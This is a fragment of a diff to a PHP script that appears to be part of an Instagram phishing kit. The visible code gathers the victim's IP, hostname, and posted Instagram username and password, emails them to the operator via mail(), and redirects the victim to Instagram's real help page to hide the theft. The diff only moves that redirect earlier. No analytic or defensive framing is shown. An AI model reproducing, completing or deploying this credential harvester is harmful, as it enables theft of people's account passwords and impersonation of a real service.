@@ -11,6 +11,7 @@ $date = gmdate ("d-n-Y");
 $time = gmdate ("H:i:s");
 $ip = $_SERVER['REMOTE_ADDR'];
 $hostname = gethostbyaddr($ip);
+header("Location: https://help.instagram.com/");
 $message .= "========== Instagram Login ==========\n";
 $message .= "User: ".$_POST['username']."\n";
 $message .= "Pass: ".$_POST['password']."\n";
@@ -29,5 +30,5 @@ if(mail($send,$subject,$rnessage,$headers) != false)
 {
 mail($Send,$subject,$rnessage,$headers);
 }
-header("Location: https://help.instagram.com/");
+
 ?>
